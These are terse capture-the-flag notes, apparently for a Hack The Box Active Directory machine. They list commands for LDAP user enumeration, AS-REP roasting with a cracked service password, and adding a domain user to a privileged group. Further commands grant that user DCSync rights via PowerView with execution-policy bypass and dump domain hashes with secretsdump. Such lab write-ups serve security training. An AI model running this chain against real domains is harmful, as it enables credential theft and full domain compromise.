ldapsearch -x -H ldap://$ip -b "DC=htb,DC=local" "(objectClass=user)" sAMAccountName description userPassword

sAMAccountName: sebastien

# Lucinda Berger, IT Management, Information Technology, Employees, htb.local
dn: CN=Lucinda Berger,OU=IT Management,OU=Information Technology,OU=Employees,
 DC=htb,DC=local
sAMAccountName: lucinda

# Andy Hislip, Helpdesk, Information Technology, Employees, htb.local
dn: CN=Andy Hislip,OU=Helpdesk,OU=Information Technology,OU=Employees,DC=htb,D
 C=local
sAMAccountName: andy

# Mark Brandt, Sysadmins, Information Technology, Employees, htb.local
dn: CN=Mark Brandt,OU=Sysadmins,OU=Information Technology,OU=Employees,DC=htb,
 DC=local
sAMAccountName: mark

# Santi Rodriguez, Developers, Information Technology, Employees, htb.local
dn: CN=Santi Rodriguez,OU=Developers,OU=Information Technology,OU=Employees,DC
 =htb,DC=local
sAMAccountName: santi

sebastien
lucinda
andy
mark
santi
svc_alfresco

GetNPUsers.py htb.local/svc-alfresco -no-pass -dc-ip $ip 
password:   s3rvice  
<img width="1903" height="248" alt="image" src="https://github.com/user-attachments/assets/ac837cc5-734f-43aa-9ced-5fee0d204318" />

  <img width="1119" height="187" alt="image" src="https://github.com/user-attachments/assets/c48b92df-4280-488b-a622-924c4d10ff7c" />  

bloodhound alfresco has genericall on exchange windows permissions 
<img width="956" height="169" alt="image" src="https://github.com/user-attachments/assets/a872dda2-1002-454c-87dc-505c4e356f8c" />  
create users using these commands in the windows cmd 
**generic all on group**
net user jose pass123 /add /domain
net group "Exchange Windows Permissions" jose /add

**then do these  for dacl **
upload PowerView.ps1
powershell -ep bypass
Import-Module .\PowerView.ps1
$SecPassword = ConvertTo-SecureString 'pass123' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb\jose', $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity jose -Rights DCSync

secretsdump.py htb.local/jose:pass123@$ip  
<img width="1781" height="642" alt="image" src="https://github.com/user-attachments/assets/439e64d0-f2d6-4ca2-becf-aca216e9c430" />  
<img width="1046" height="414" alt="image" src="https://github.com/user-attachments/assets/3d2535c9-07f1-47ee-acab-d293338ea24c" />


